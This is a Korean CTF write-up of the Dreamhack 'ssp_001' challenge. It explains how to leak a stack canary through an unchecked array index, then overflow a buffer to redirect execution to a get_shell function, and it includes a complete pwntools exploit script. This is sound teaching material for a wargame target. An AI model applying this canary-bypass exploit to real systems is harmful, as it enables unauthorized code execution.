# Dreamhack `ssp_001` 풀이 정리

> 32비트 바이너리. **Stack Canary**가 걸려 있어 단순 버퍼 오버플로로는 RET를 못 덮는다. → **P 메뉴(경계 검사 없는 인덱스 출력)로 카나리를 Leak** → **E 메뉴(크기 무제한 입력)로 BOF** → RET를 `get_shell`로 덮어 셸을 띈다.

- **분류:** System / Pwnable (SSP, Stack Canary)
- **관련 노트:** [[stack-canary]], [[stack-buffer-overflow]]

---

## 1. 보호 기법 (checksec)

```
[*] '/home/ion/wargame/dreamhack/pwnable/ssp_001/ssp_001'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found       ← 카나리 있음
    NX:       NX enabled         ← 스택 실행 불가
    PIE:      No PIE (0x8048000)  ← 코드 주소 고정
```

- **32비트** 바이너리다. (카나리는 `gs:0x14`에 있고 **4바이트**다.)
- **Canary** 때문에 버퍼를 넘쳐 RET를 덮으면 종료 전 검증에서 걸린다. → 카나리 값을 **알아내야** 한다.
- **NX** 때문에 스택에 쉘코드를 올려 실행할 수 없다. → 코드 주입 대신 **기존 함수(`get_shell`)로 점프**한다.
- **No PIE** 라서 `get_shell` 주소가 **고정**이다. → 주소를 그대로 payload에 박으면 된다.

> "이 문제는 32비트 바이너리고, 보호 기법을 보면 카나리랑 NX가 걸려 있음. 카나리 때문에 그냥 오버플로로 리턴 주소를 덮으면 프로그램이 죽어버림. 그래서 **카나리 값을 먼저 알아내야** 함. 대신 PIE가 꺼져 있어서 함수 주소는 고정이고, 마침 셸을 띄워주는 `get_shell` 함수가 있어서, 리턴 주소만 거기로 돌리면 셸을 딸 수 있는 구조이다."

## 2. 문제 코드 분석

```c
void get_shell() { system("/bin/sh"); }          // ← 이 함수로 점프하면 셸

void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);  // 경계 검사 없음
}

int main(...) {
    unsigned char box[0x40] = {};   // 64바이트
    char name[0x40] = {};           // 64바이트
    ...
    switch(select[0]) {
        case 'F': read(0, box, sizeof(box)); break;        // box에 64바이트 입력
        case 'P': scanf("%d", &idx); print_box(box, idx); break;  // box[idx] 출력
        case 'E': scanf("%d", &name_len);
                  read(0, name, name_len); return 0;       // 크기 무제한 입력 → BOF
    }
}
```

두 가지 버그:

| 메뉴  | 버그                                                                                             | 쓰임새                             |
| ----- | ------------------------------------------------------------------------------------------------ | ---------------------------------- |
| **P** | `print_box`가 `idx` **경계 검사를 안 한다.** `box[64]` 이상도 출력 가능                          | 스택을 읽는 창구 → **카나리 Leak** |
| **E** | `name_len`을 **사용자가 정한다.** `read(0, name, name_len)`로 `name` 버퍼(64B)를 넘겨 쓸 수 있다 | **버퍼 오버플로** → RET 덮기       |

> "코드를 보면 쓸 수 있는 기능이 세 개인데, 공격에 쓰는 건 P랑 E 두 개이다. P 메뉴는 `box` 배열의 인덱스를 받아서 그 값을 출력해 주는데, **인덱스 범위를 검사하지 않음.** 그래서 64보다 큰 인덱스를 주면 배열을 넘어서 그 뒤 스택에 있는 값, 즉 카나리까지 읽을 수 있다. E 메뉴는 이름 크기를 **내가 직접 정하고** 그 크기만큼 입력을 받는데, 버퍼는 64바이트밖에 안 되니까 그걸 넘겨서 입력하면 **버퍼 오버플로**가 난다. 이 두 개를 조합해서 구성해야한다."

## 3. 스택 구조 (디버깅)

디스어셈블로 각 변수의 위치를 구했다.

```
select   = [ebp-0x8a]
box      = [ebp-0x88]   ← 0x40(64)바이트
idx      = [ebp-0x94]
name     = [ebp-0x48]   ← 0x40(64)바이트
name_len = [ebp-0x90]
canary   = [ebp-0x8]    ← mov eax, gs:0x14 ; mov [ebp-0x8], eax
```

```
낮은 주소
┌─────────────────────────────┐
│ box  [ebp-0x88]  (64 byte)  │ ← P 메뉴로 여기부터 읽기 시작
│   ...                       │
│ name [ebp-0x48]  (64 byte)  │ ← E 메뉴로 여기부터 덮어쓰기 시작
│   ...                       │
│ canary [ebp-0x8] (4 byte)   │ ← gs:0x14 에서 복사한 값
│ saved edi [ebp-0x4]         │
│ saved ebp (SFP) [ebp+0x0]   │
│ RET            [ebp+0x4]    │ ← get_shell로 덮을 목표
└─────────────────────────────┘
높은 주소
```

**거리 계산 (핵심):**

- **box → canary**: `0x88 - 0x8 = 0x80 = 128` → P 메뉴에서 **idx 128~131**이 카나리 4바이트.
- **name → RET**: `0x48 + 0x4 = 0x4c = 76` → E 메뉴에서 **76바이트** 뒤가 RET.
  - 세부: `name`부터 **64바이트**면 canary, +**4바이트** canary, +**8바이트**(saved edi 4 + SFP 4), 그다음이 RET.

> "디버거로 스택을 뜯어보면, 입력받는 `box`랑 `name` 버퍼가 있고, 그 위쪽에 카나리, 그리고 맨 위에 리턴 주소가 있다. 중요한 건 거리인데 `box` 시작점부터 카나리까지가 **128바이트**이다. 그래서 P 메뉴에 인덱스 128번부터 131번까지 주면 **카나리 4바이트를 그대로 읽을 수 있다.** 그리고 `name` 버퍼부터 리턴 주소까지는 **76바이트** 떨어져 있다. 이 두 숫자, 128이랑 76이 이 문제의 핵심 숫자여서 기억해두고 다음 진행함."

## 4. 카나리 Leak (P 메뉴)

P 메뉴로 `box[128]`~`box[131]`을 읽으면 카나리 4바이트가 나온다.

```
> P
Element index : 128
Element of index 128 is : 00     ← 카나리 최하위 바이트 (항상 00)
> P
Element index : 129
Element of index 129 is : 02
> P
Element index : 130
Element of index 130 is : 95
> P
Element index : 131
Element of index 131 is : 61     ← 카나리 최상위 바이트
```

- 읽은 순서(낮은 주소 → 높은 주소)는 리틀엔디안이므로, **131 → 128 순으로 이어 붙이면** 실제 값: `0x61950200`.
- **최하위 바이트가 `00`(널 바이트)** 인 것을 확인 → 카나리가 맞다는 검증 포인트다.

> "이제 카나리를 빼냄. P 메뉴에 인덱스 128, 129, 130, 131을 차례로 넣으면 한 바이트씩 값이 나오게 된다. 보면 128번 값이 `00`인데, 이게 바로 리눅스 카나리의 특징이래요. **카나리 맨 끝 바이트는 항상 널 바이트 00**인데 문자열 함수가 카나리를 통째로 복사하거나 흘리지 못하게 막으려고 그렇게 설계돼 있다고 함. 어쨌든 이 네 바이트를 메모리 순서에 맞게 이어 붙이면 카나리 값이 완성됨. 이제 **카나리를 알았으니** 오버플로를 해도 안 걸리게 됨."

## 5. 버퍼 오버플로 — payload 구성 (E 메뉴)

카나리를 알았으니, 오버플로 payload 중간에 **카나리를 원래 값 그대로 끼워 넣어** 검증을 통과시키고 RET를 `get_shell`로 덮는다.

```
payload = b'A' * 64        # name 버퍼를 카나리 직전까지 채움
        + p32(canary)      # 카나리 자리에 Leak한 값 그대로 (검증 통과)
        + b'A' * 8         # saved edi(4) + saved ebp/SFP(4)
        + p32(get_shell)   # RET → get_shell 주소
```

```
[  'A' * 64  ][ canary ][ 'A' * 8 ][ get_shell ]
 name~canary   4 byte   edi+SFP      RET(4 byte)
```

> "마지막으로 E 메뉴에서 오버플로를 일으킴. 이름 크기를 크게 주고, payload를 이렇게 구성함. 먼저 `A`를 64개 넣어서 `name` 버퍼를 카나리 직전까지 채움. 그다음 **아까 알아낸 카나리 값을 그 자리에 똑같이** 넣음. 이게 > 카나리를 원래 값 그대로 복원해 두면 프로그램이 '어, 안 바뀌었네' 하고 검증을 통과하게 된다. 그 뒤에 더미 8바이트를 채우고, 마지막에 리턴 주소 자리에 `get_shell` 함수 주소를 넣는다. 그러면 함수가 끝날 때 카나리 검사를 통과하고, 리턴 주소가 `get_shell`로 돼 있으니 셸이 뜨게 된다."

## 6. 익스플로잇 코드

```python
from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 9485)
e = ELF("./ssp_001")
get_shell = e.symbols['get_shell']

# 1) Canary Leak — P 메뉴로 box[131]~box[128] 읽어 이어붙이기
canary = b""
i = 131
while i >= 128:
    p.sendlineafter("> ", 'P')
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil("is : ")
    canary += p.recvn(2)
    i -= 1
canary = int(canary, 16)
slog("canary", canary)

# 2) BOF — E 메뉴로 name 오버플로, RET를 get_shell로
payload  = b'A' * 64
payload += p32(canary)
payload += b'A' * 8
payload += p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
```

> "코드는 pwntools로 크게 두 부분으로 짰다. 앞부분은 카나리 릭이고 P 메뉴에 인덱스 131부터 128까지 보내면서 돌아오는 한 바이트씩을 이어 붙여서 카나리를 복원하는 코드이다. 뒷부분은 오버플로인데 `get_shell` 주소는 ELF에서 심볼로 바로 가져오고, 아까 설명한 payload를 만들어서 E 메뉴로 보내게 된다. 마지막에 `interactive`로 셸을 잡음. 참고로 host랑 port는 인스턴스를 켤 때마다 바뀌니까 그 부분만 바꿔주면 됩."

## 요약

**경계 검사 없는 출력(P)으로 카나리 Leak → 카나리를 복원해 끼운 오버플로(E)로 RET를 `get_shell`에 덮기.** 카나리는 "값을 알면 뚫린다"는 것을 보여주는 대표 문제다. → [[stack-canary]] 우회 기법 (1) 카나리 Leak 사례.
